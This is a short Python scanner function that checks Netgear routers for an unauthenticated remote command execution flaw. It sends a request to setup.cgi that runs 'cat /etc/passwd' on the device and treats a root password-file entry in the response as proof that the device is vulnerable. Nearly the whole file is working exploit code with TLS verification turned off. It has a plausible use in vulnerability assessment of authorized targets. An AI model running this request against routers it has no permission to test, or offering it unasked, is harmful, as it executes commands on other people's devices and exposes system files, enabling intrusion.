import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(baseurl):
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=cat%20/etc/passwd&curpath=/&currentsetting.htm=1"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and re.search("root:.*:0:0:",response.text):
		r1=True
	else:
		r1=False
	if r1:
		return True
	else:
		return False
